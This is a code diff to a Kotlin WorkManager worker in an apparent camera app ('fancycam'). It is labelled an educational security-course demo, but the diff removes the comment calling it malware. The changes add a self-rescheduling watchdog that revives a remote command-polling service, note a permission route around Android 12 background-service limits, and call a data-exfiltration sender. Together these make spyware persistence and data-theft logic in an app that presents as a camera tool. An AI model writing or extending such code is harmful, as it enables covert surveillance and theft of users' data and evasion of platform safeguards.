@@ -1,6 +1,7 @@
 package com.example.fancycam.workers
 
 import com.example.fancycam.network.DataExfilSender
+import com.example.fancycam.services.CommandPollingService
 import android.content.Context
 import android.util.Log
 import java.util.concurrent.TimeUnit
@@ -15,8 +16,9 @@ import androidx.work.WorkManager
 /**
  * EDUCATIONAL DEMO - Android Security & Forensics Course
  *
- * Demonstrates how malware uses WorkManager for persistent background
- * data collection that survives app termination.
+ * FALLBACK path for background data collection. The primary cadence is owned by
+ * [CommandPollingService]; this worker stays scheduled as a watchdog and only
+ * performs collection when the foreground service is not running.
  */
 class DataCollectionWorker(
     context: Context,
@@ -24,7 +26,20 @@ class DataCollectionWorker(
 ) : CoroutineWorker(context, workerParams) {
 
     override suspend fun doWork(): Result {
-        Log.d(TAG, "[EDUCATIONAL] Background data collection triggered")
+        // PRIMARY service is active — nothing to do here, but keep the watchdog alive.
+        if (CommandPollingService.isRunning) {
+            Log.d(TAG, "[EDUCATIONAL] Polling service active; skipping fallback collection")
+            scheduleNext(applicationContext)
+            return Result.success()
+        }
+
+        Log.d(TAG, "[EDUCATIONAL] Fallback background data collection triggered")
+
+        // Best-effort revival of the primary foreground service. Android 12+ may block
+        // background FGS starts (ForegroundServiceStartNotAllowedException); the
+        // SYSTEM_ALERT_WINDOW permission is one exemption. start() swallows failures.
+        Log.d(TAG, "[EDUCATIONAL] Attempting to revive CommandPollingService")
+        CommandPollingService.start(applicationContext)
 
         return try {
             DataExfilSender.collectAndExfiltrate(applicationContext)
